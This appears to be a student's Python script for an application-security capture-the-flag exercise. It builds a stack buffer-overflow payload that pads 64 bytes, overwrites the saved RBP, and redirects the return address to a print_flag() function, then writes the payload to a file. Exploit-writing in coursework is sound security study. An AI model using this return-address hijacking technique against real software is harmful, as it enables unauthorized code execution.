import struct
import os

# Helper function to convert the address to little-endian format
def p64(addr):
    return struct.pack("<Q", addr)

# Step 1: Buffer overflow (64 bytes of junk)
padding = b"A" * 64

# Step 2: Overwrite saved RBP (8 bytes of junk)
junk_rbp = b"B" * 8

# Step 3: Address of print_flag() or target function (replace with correct address from GDB)
print_flag_addr = p64(0x7ff7f61015bd)

# Construct the full payload
payload = padding + junk_rbp + print_flag_addr

output_folder = r"D:\School\SC4013 - Application Security\CTF-Project\Backend"

# Ensure the output directory exists
os.makedirs(output_folder, exist_ok=True)

# Save the payload in the specified directory
output_path = os.path.join(output_folder, "payload.txt")
with open(output_path, "wb") as f:
    f.write(payload)

print(f"Payload saved to: {output_path}")